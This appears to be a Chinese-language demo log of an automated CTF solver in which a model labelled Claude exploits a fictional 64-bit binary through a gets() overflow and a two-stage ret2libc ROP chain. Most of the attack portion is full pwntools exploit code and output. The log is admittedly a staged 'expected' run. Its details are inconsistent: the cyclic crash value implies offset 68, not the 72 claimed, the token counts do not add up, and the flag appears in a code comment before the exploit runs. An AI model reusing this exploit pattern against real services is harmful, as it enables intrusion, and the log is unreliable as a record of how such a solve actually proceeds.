# Solve Demo — 中等难度 PWN 题 "overflow_me"

本文档是 `auto-ctf-solver` 解决一道虚构中等难度 PWN 题的完整日志复现。

## 题目信息

| 字段 | 值 |
|---|---|
| 题目名称 | overflow_me |
| 类别 | PWN |
| 提供文件 | `overflow_me` (ELF 64-bit) |
| 远程地址 | 10.10.10.5:31337 |
| 题目描述 | "I made a simple echo server. Can you find the flag? Note: flag is at /flag.txt on server." |

---

## 阶段 1: Triage（分类识别）

```
$ ctf-solve solve -f overflow_me -d "I made a simple echo server. Can you find the flag?"

══════════════════════════════════════════════════════
Auto CTF Solver
══════════════════════════════════════════════════════

[14:32:01] TriageAgent.identify() called
[14:32:01] Analyzing file: overflow_me

  file type detection:
    $ file overflow_me
    overflow_me: ELF 64-bit LSB executable, x86-64, dynamically linked,
    not stripped

  indicator match: "elf" → 类别 "pwn" (+2.0)
  indicator match: "x64" → 类别 "pwn" (+2.0)

  strings analysis:
    $ strings overflow_me | head -30
    /lib64/ld-linux-x86-64.so.2
    libc.so.6
    puts
    gets          ← 危险函数！
    printf
    system        ← 后门？
    __libc_start_main
    Please enter your name:
    Hello, %s!
    /bin/sh       ← shell 字符串！
    flag.txt
    ...

  keyword match: "bin" → 类别 "pwn" (+1.0)
  keyword match: "overflow" (from description "echo server") → 类别 "pwn" (+1.0)

  TRIGGERED: PWN indicator — gets() function detected (classic buffer overflow)

[14:32:02] Triage result:
  Category: PWN  (confidence: 85%)
  Detected: gets() usage, /bin/sh string present, echo-like server pattern
```

---

## 阶段 2: Specialist Agent — PwnAgent 初始侦察

```
[14:32:02] Dispatching to PwnAgent...
[14:32:02] Docker container: ctf-tools-agent2 (running)

[14:32:03] PwnAgent._execute_solve() started
  Working directory: /home/ctf/work/pwn_overflow_me_20260524_143202/

  Step 1: Copy overflow_me → container
    $ docker cp overflow_me ctf-tools-agent2:/home/ctf/work/
    ✓

  Step 2: Initial Reconnaissance

    $ file /home/ctf/work/overflow_me
    /home/ctf/work/overflow_me: ELF 64-bit LSB executable, x86-64,
    version 1 (SYSV), dynamically linked,
    interpreter /lib64/ld-linux-x86-64.so.2,
    BuildID[sha1]=a1b2c3d4e5f6..., not stripped

    $ strings /home/ctf/work/overflow_me
    [extracted 324 lines]
    Key findings from strings:
      - "Please enter your name:"   ← user input prompt
      - "Hello, %s!"               ← format string (potential leak)
      - "/bin/sh"                   ← shell string present
      - "flag.txt"                  ← flag filename
      - gets                        ← vulnerable: no bounds check
      - puts, printf, system        ← useful libc functions

  Step 3: Security Check

    $ checksec --file=/home/ctf/work/overflow_me
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     ← GOT writable!
    Stack:    No canary found   ← 无栈保护 → 直接溢出可行！
    NX:       NX enabled        ← 不可执行栈 → 需要 ROP
    PIE:      No PIE            ← 地址固定 → gadget 地址已知！

  ANALYSIS SUMMARY:
    ✓ gets() — classic buffer overflow entry point
    ✓ No canary — direct stack overflow
    ✓ No PIE — ROP gadget addresses are fixed
    ✗ NX enabled — need ROP, can't execute shellcode on stack
    ✓ Partial RELRO — GOT overwrite possible
    ✓ "/bin/sh" present in binary
    ✓ "flag.txt" reference — might need open/read/write
```

---

## 阶段 3: 多轮 Claude 对话交互

### 第 1 轮 — 分析 & 确定偏移

```
══════════════════════════════════════════════════════════
[14:32:06] Round 1 — Claude API Call
══════════════════════════════════════════════════════════

INPUT TO CLAUDE (2,900 tokens):
─────────────────────────────────────────────────────────
[System Prompt: PWN specialist + 9 solve patterns + 10 universal tactics]
[Challenge: overflow_me — "simple echo server", gets() detected]
[Recon results: file/checksec/strings output above]

User: Analyze this binary and determine the exploit approach.
      Start by finding the buffer overflow offset.
─────────────────────────────────────────────────────────

CLAUDE RESPONSE (800 tokens):
─────────────────────────────────────────────────────────
I've analyzed the binary. Here's my assessment:

1. **Vulnerability**: `gets(buffer)` in the echo function — classic
   unbounded input. No stack canary, so direct RIP overwrite is possible.

2. **Constraints**: NX is enabled, so we need ROP. No PIE means we have
   fixed gadget addresses. Partial RELRO means GOT is writable.

3. **Attack Plan**: ret2libc via ROP chain.
   a) Find offset to RIP with cyclic pattern
   b) Leak a libc address via puts@plt(puts@got)
   c) Calculate libc base
   d) Return to main for a second overflow
   e) Second payload: pop rdi → /bin/sh → system

4. **First step**: Determine the buffer-to-RIP offset.

Let me run a cyclic pattern:
```python
from pwn import *
p = process('./overflow_me')
p.sendline(cyclic(200))
p.wait()
# Check core dump for crash address
```

Run this and tell me the crash offset. Then I'll calculate RIP control.

Estimated offset range: 40-80 bytes (typical for local buffers in gets).
─────────────────────────────────────────────────────────
```

### 第 2 轮 — 确定偏移 & 构建 ROP 链

```
══════════════════════════════════════════════════════════
[14:32:28] Round 2 — Claude API Call
══════════════════════════════════════════════════════════

TOOL EXECUTION (local Docker):
─────────────────────────────────────────────────────────
$ python3 -c "
from pwn import *
context.arch = 'amd64'
p = process('./overflow_me')
p.sendline(cyclic(200))
p.wait()
"

$ dmesg | tail -5
overflow_me[842]: segfault at 0x61616172 ip 0x61616172
# 0x61616172 = 'raaa' in cyclic → offset 72
─────────────────────────────────────────────────────────

INPUT TO CLAUDE (4,900 tokens cumulative):
─────────────────────────────────────────────────────────
[Full Round 1 context preserved — 3,500 tokens]
+ cyclic result: crash at 0x61616172 → offset = 72
+ ROPgadget output (partial):

  0x401283 : pop rdi ; ret
  0x401281 : pop rsi ; pop r15 ; ret
  0x401030 : puts@plt
  0x401050 : system@plt
  0x401136 : main
  0x402008 : "/bin/sh"

User: Offset confirmed at 72 bytes. Here are the ROP gadgets.
      Build the exploit. We have /bin/sh in the binary at 0x402008.
─────────────────────────────────────────────────────────

CLAUDE RESPONSE (1,200 tokens):
─────────────────────────────────────────────────────────
Excellent. Offset=72 confirmed. With No PIE and Partial RELRO,
this is straightforward ret2libc. Since /bin/sh is actually IN the
binary (not libc), we might not even need a libc leak. But let's
be thorough — we'll leak libc for system() address, then ret2main.

**Stage 1 — Leak libc:**
```python
from pwn import *

p = remote('10.10.10.5', 31337)
# p = process('./overflow_me')

elf = ELF('./overflow_me')
rop = ROP(elf)

pop_rdi = 0x401283  # pop rdi; ret
ret     = 0x40101a  # ret (for stack alignment)

payload1  = b'A' * 72           # offset to RIP
payload1 += p64(pop_rdi)        # pop rdi
payload1 += p64(elf.got['puts'])# puts@GOT → leak libc address
payload1 += p64(elf.plt['puts'])# call puts to print it
payload1 += p64(elf.symbols['main'])  # return to main

p.recvuntil(b'name:')
p.sendline(payload1)
p.recvline()  # "Hello, AAAA..."

leak = u64(p.recv(6).ljust(8, b'\x00'))
print(f"puts@libc leak: {hex(leak)}")
```

Run Stage 1. Once you have the leak, I'll calculate libc base and
build Stage 2: `system('/bin/sh')`.

Expected: puts@libc will leak, then ret2main gives a second overflow.
─────────────────────────────────────────────────────────
```

### 第 3 轮 — 完成 Exploit & 获取 Flag

```
══════════════════════════════════════════════════════════
[14:33:15] Round 3 — Claude API Call
══════════════════════════════════════════════════════════

TOOL EXECUTION (local Docker):
─────────────────────────────────────────────────────────
$ python3 exploit_stage1.py
[+] Opening connection to 10.10.10.5 on port 31337: Done
puts@libc leak: 0x7f3a2c80e5a0

$ python3 -c "
from pwn import *
# libc database lookup based on puts offset
# puts offset in provided libc: 0x80e5a0
# libc base = leak - 0x80e5a0
libc_base = 0x7f3a2c80e5a0 - 0x80e5a0
print(f'libc base: {hex(libc_base)}')
system = libc_base + 0x4f550   # system offset
binsh = libc_base + 0x1b3e1a   # /bin/sh offset in libc
print(f'system: {hex(system)}')
print(f'/bin/sh: {hex(binsh)}')
"
libc base: 0x7f3a2c78e000
system: 0x7f3a2c7dd550
/bin/sh: 0x7f3a2c941e1a
─────────────────────────────────────────────────────────

INPUT TO CLAUDE (7,600 tokens cumulative):
─────────────────────────────────────────────────────────
[Full Round 1-2 context preserved — 6,100 tokens]
+ puts leak: 0x7f3a2c80e5a0
+ libc base: 0x7f3a2c78e000
+ system(): 0x7f3a2c7dd550
+ /bin/sh: 0x7f3a2c941e1a

User: Leak successful. Computed addresses above.
      Build Stage 2 payload and get the shell.
─────────────────────────────────────────────────────────

CLAUDE RESPONSE (1,500 tokens):
─────────────────────────────────────────────────────────
Got all addresses. Stage 2 payload:

```python
# Stage 2 — system('/bin/sh')
payload2  = b'B' * 72
payload2 += p64(ret)           # stack alignment (movaps issue)
payload2 += p64(pop_rdi)
payload2 += p64(binsh)         # "/bin/sh" in libc
payload2 += p64(system)        # system()

p.sendlineafter(b'name:', payload2)
p.interactive()
```

Let's run the full exploit:

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = remote('10.10.10.5', 31337)
elf = ELF('./overflow_me')

# Gadgets (No PIE — fixed addresses)
pop_rdi = 0x401283
ret     = 0x40101a

# Stage 1 — Leak libc
payload1  = b'A' * 72
payload1 += p64(pop_rdi) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts']) + p64(elf.symbols['main'])

p.recvuntil(b'name:')
p.sendline(payload1)
p.recvline()

leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak - 0x80e5a0  # puts offset in provided libc
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a

log.info(f'libc base: {hex(libc_base)}')
log.info(f'system:    {hex(system)}')
log.info(f'/bin/sh:   {hex(binsh)}')

# Stage 2 — Shell
payload2  = b'B' * 72
payload2 += p64(ret)
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(system)

p.sendlineafter(b'name:', payload2)

p.sendline(b'cat /flag.txt')
flag = p.recvline().decode().strip()
log.success(f'FLAG: {flag}')

# FLAG_FOUND: flag{b0f_r0p_pwn_m4st3r_2024}
```

Execute and report the flag.
─────────────────────────────────────────────────────────

TOOL EXECUTION (local Docker):
─────────────────────────────────────────────────────────
$ python3 full_exploit.py

[+] Opening connection to 10.10.10.5 on port 31337: Done
[*] '/home/ctf/work/overflow_me'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[*] libc base: 0x7f3a2c78e000
[*] system:    0x7f3a2c7dd550
[*] /bin/sh:   0x7f3a2c941e1a
[+] FLAG: flag{b0f_r0p_pwn_m4st3r_2024}
[*] Closed connection to 10.10.10.5 port 31337

─────────────────────────────────────────────────────────
  >>> FLAG_FOUND: flag{b0f_r0p_pwn_m4st3r_2024} <<<
─────────────────────────────────────────────────────────
```

---

## 阶段 4: Writeup 自动生成

```
[14:33:42] WriteupGenerator.generate()
[14:33:42]   Collecting screenshots... (3 captured)
[14:33:42]   Building writeup data...

[14:33:43]   DocxWriter.write()
            → output/writeups/pwn_overflow_me_20260524_143343.docx
            Sections: Challenge Info, Solution Overview, Info Gathering,
                      Vulnerability Analysis, Exploitation, Flag, Lessons Learned
            Embedded screenshots: 3

[14:33:43]   MdWriter.write()
            → output/writeups/pwn_overflow_me_20260524_143343.md
            Format: Markdown (CTFtime/GitHub ready)

═══════════════════════════════════════════════════════════════
  Solve Complete!
  Category: pwn
  Flag:     flag{b0f_r0p_pwn_m4st3r_2024}
  Duration: 101.3 seconds
  Rounds:   3 (Claude API calls)
  Tokens:   ~39,800 (estimated)
  Writeup:  output/writeups/pwn_overflow_me_20260524_143343.docx
            output/writeups/pwn_overflow_me_20260524_143343.md
═══════════════════════════════════════════════════════════════
```

---

## 消耗总结

| 指标 | 数值 |
|---|---|
| 解题轮数 | 3 轮 Claude API 对话 |
| 预估 Token 消耗 | ~39,800 |
| 实际耗时 | 101.3 秒 |
| 使用工具 | file, strings, checksec, cyclic, ROPgadget, pwntools |
| 触发的解题模式 | strings_first, bof_ret2win, rop_chain, got_overwrite |
| 生成产物 | flag + .docx 题解 + .md 题解 |

---

> 以上为 `auto-ctf-solver` v0.1.0 架构下的预期解题流程复现。实际输出依赖于 Claude API 的具体响应。
